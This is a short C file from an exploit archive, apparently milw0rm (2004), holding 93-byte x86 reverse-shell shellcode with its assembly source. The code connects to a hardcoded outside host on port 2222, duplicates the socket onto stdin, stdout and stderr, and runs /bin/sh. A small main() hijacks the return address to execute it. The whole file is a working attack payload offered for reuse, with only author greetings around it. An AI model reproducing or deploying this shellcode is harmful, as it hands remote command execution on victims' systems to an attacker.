/*  the back-connect shellcode. The destination addr is
0x28402ec3 (rootteam.host.sk) port is 0x8ae (2222).
size = 93 bytes (little isn't it?)
Greetz 2 sp00fed
	written  by 		dev0id #rus-sec /EFnet (rootteam.host.sk)

BITS	32

jmp short	path
main:
	pop	esi
	xor	eax,eax
	mov byte [esi+1],0x02 	; filling the sock_addr struct
	mov word [esi+2],0x08ae
	mov long [esi+4],0x28402ec3 ;(here your addr: rootteam.host.sk)
	push byte 0x06		;int socket(int domain,int type, int proto)
	push byte 0x01
	push byte 0x02
	mov	al,97		;/usr/include/sys/syscall.h (socket)
	push	eax
	int	0x80
	mov 	edx,eax		;now in edx we have the descriptor
	push byte 0x10		;making connect
	lea	eax,[esi]
	push	eax
	push	edx		;eax is our socket descriptor
	xor	eax,eax
	mov	al,98		;/usr/include/sys/syscall.h (connect)
	push	eax
	int	0x80
	mov	cl,3
	mov	ebx,-1
loop_1:				;making dup2 3 times
	inc	ebx
	push	ebx
	push	edx
	mov	al,90
	push	eax
	int	0x80
	loopnz	loop_1
	xor	eax,eax
	push    eax
	push long 0x68732f2f
	push long 0x6e69622f
	mov	edx,esp
	push	eax
	push	esp
	push	edx
	mov	al,59		;/usr/include/sys/syscall.h(execve)
	push	eax
	int	0x80
path:
	call 	main
	db 'A'
*/
char shellcode[] =
	"\xeb\x56\x5e\x31\xc0\xc6\x46\x01\x02\x66\xc7\x46\x02\xae\x08"
	"\xc7\x46\x04\xc3\x2e\x40\x28\x6a\x06\x6a\x01\x6a\x02\xb0\x61"
	"\x50\xcd\x80\x89\xc2\x6a\x10\x8d\x06\x50\x52\x31\xc0\xb0\x62"
	"\x50\xcd\x80\xb1\x03\xbb\xff\xff\xff\xff\x43\x53\x52\xb0\x5a"
	"\x50\xcd\x80\xe0\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
	"\x62\x69\x6e\x89\xe2\x50\x54\x52\xb0\x3b\x50\xcd\x80\xe8\xa5"
	"\xff\xff\xff\x41";
int
main()
{
	int *ret;
	ret=(int*)&ret+2;
	(*ret)=(int)shellcode;
}

// milw0rm.com [2004-09-26]